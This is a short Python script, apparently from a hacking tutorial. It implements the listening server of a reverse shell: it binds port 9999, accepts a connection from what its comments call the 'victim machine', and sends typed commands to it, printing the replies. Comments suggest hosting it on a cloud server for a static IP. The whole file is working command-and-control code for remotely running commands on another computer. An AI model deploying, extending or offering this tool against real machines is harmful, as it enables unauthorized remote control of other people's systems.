# This python file able to connect only to a single client machine


import socket
import sys

# creating a socket ( used to connect two computers..)
def create_socket():
    try:
        global host
        global port
        global s     # socket object variable..
        host = ""    # better  to create a server in digital ocean so that ip will be static..
        port = 9999  # not commonly used port..
        s = socket.socket()

    except socket.error as msg:
        print("Socket creation Error: " +str(msg))

# Binding the host and port for the socket connection..
def bind_socket():
    try:
        global host
        global port
        global s

        print("Binding the Port: " +str(port))
        s.bind((host,port))
        s.listen(5)

    except socket.error as msg:
        print("Socket Binding Failed: " +str(msg) + "\n" + "Retrying....")
        bind_socket()

#Establish the connection through the client..(AS a server we have to accept the client )
def accept_socket():
    conn, address = s.accept()   # accept method stores the connection object and address of the client with port..
    print("Connection Established with: " + "IP " + address[0] + " Port " + str(address[1]))
    send_commands(conn)
    conn.close()

#sending the commands to the client/victim machine ...

def send_commands(conn):
    while True:
        cmd = input()
        if cmd == "quit":
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024),"utf-8")
            print(client_response, end="")

# calling above all the functions..

def main():
    create_socket()
    bind_socket()
    accept_socket()   # this it self calling the send_command function..

main()





